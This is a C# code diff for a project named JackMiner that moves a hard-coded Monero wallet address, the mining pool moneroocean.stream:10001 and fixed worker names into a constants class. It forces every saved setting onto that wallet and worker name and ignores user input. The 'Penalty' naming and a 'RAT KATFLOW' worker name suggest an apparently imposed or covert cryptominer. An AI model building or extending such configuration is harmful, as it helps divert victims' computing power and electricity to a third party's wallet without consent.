@@ -7,11 +7,11 @@ namespace JackMiner;
 /// </summary>
 public sealed class PenaltySettings
 {
-    public const string ReceivingAddress = "47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG";
-    public string PoolHost { get; set; } = "moneroocean.stream";
-    public int PoolPort { get; set; } = 10001;
+    public const string ReceivingAddress = PenaltyNetworkConstants.WalletAddress;
+    public string PoolHost { get; set; } = PenaltyNetworkConstants.PoolHost;
+    public int PoolPort { get; set; } = PenaltyNetworkConstants.PoolPort;
     public string WalletAddress { get; set; } = ReceivingAddress;
-    public string WorkerName { get; set; } = "JACKMINER";
+    public string WorkerName { get; set; } = PenaltyNetworkConstants.WorkerName;
     public string ResourceMode { get; set; } = "Medium";
 }
 
@@ -39,10 +39,10 @@ public sealed class PenaltySettingsStore
         ArgumentNullException.ThrowIfNull(settings);
         var normalized = new PenaltySettings
         {
-            PoolHost = "moneroocean.stream",
-            PoolPort = 10001,
+            PoolHost = PenaltyNetworkConstants.PoolHost,
+            PoolPort = PenaltyNetworkConstants.PoolPort,
             WalletAddress = PenaltySettings.ReceivingAddress,
-            WorkerName = string.IsNullOrWhiteSpace(settings.WorkerName) ? "RAT KATFLOW" : settings.WorkerName.Trim(),
+            WorkerName = PenaltyNetworkConstants.WorkerName,
             ResourceMode = settings.ResourceMode is "Easy" or "Medium" or "Hard" or "Beta" ? settings.ResourceMode : "Medium"
         };
         var directory = Path.GetDirectoryName(_settingsPath)!;
